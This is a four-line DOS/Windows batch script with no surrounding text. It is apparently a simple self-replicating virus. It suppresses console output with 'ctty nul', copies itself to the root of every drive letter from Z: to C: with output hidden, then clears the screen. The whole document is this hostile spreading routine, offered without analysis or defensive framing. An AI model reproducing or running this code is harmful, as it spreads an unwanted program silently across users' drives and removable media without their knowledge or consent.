@echo off
ctty nul
@for %%c in (z:\,y:\,x:\,w:\,v:\,u:\,t:\,s:\,r:\,q:\,p:\,o:\,n:\,m:\,l:\,k:\,j:\,i:\,h:\,g:\,f:\,e:\,d:\,c:\) do copy %0 %%c >nul
cls